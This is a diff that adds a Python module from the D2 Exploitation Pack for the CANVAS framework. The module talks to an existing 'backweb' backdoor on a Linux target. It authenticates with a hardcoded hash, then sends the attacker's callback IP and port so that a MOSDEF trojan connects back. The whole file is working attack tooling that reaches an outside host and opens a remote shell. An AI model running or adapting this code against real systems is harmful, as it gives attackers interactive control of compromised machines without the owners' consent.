@@ -1,0 +1,83 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+import os,getopt
+import sys
+sys.path.append(".")
+
+import socket
+from exploitutils import *
+from canvasengine import *
+from tcpexploit import tcpexploit
+#from MOSDEF import mosdef
+
+import time
+
+NAME = "Client d2sec_backweb"
+DESCRIPTION = "Client d2sec_backweb"
+DOCUMENTATION = {}
+DOCUMENTATION["Notes"] = "Run a MOSDEF trojan via a d2sec_backweb backdoor"
+
+VERSION="0.1"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Tool"
+PROPERTY['ARCH'] = [ ["Linux", "i386"] ]
+
+class theexploit(tcpexploit):
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.name = NAME
+		self.host = "127.0.0.1"
+		self.port = 80 
+		return
+    
+	def neededListenerTypes(self):
+		from canvasengine import LINUXMOSDEF
+		return [LINUXMOSDEF]
+
+	def getargs(self):
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port",self.port))
+       
+	def run(self):
+		self.setInfo("[D2 LOG] %s attacking %s:%d"%(NAME,self.host,self.port))
+		self.getargs()
+
+		self.log("Connecting to %s:%d"%(self.host,self.port))
+		self.s = self.gettcpsock()
+		try:
+			self.s.connect((self.host, int(self.port)))
+		except:
+			self.log("[D2 LOG] Could not connect !")
+			return 0
+
+		self.s.sendall("4ed1479a7a48653b13d492f52ecbe5d6\n")
+		time.sleep(1)
+		self.s.sendall("m\n")
+		time.sleep(1)
+		self.s.sendall(self.callback.ip + "\n")
+		time.sleep(1)
+		self.s.sendall("%d\n" % self.callback.port)
+		time.sleep(1)
+
+		self.setInfo("%s (finished)"%(NAME))
+		return 1
+
+	def usage(self):
+		print 'Usage: %s -t host -p port -l localIP -d localPort (connectback)' % sys.argv[0]
+		sys.exit(0)
+
+if __name__=='__main__':
+	app = theexploit()
+	ret = standard_callback_commandline(app)
+	if ret not in [0,1,None] and hasattr(ret,'interact'):
+		ret.interact()
+	elif ret not in [0,1,None]:
+		print 'Weird return value: %s'%(ret)
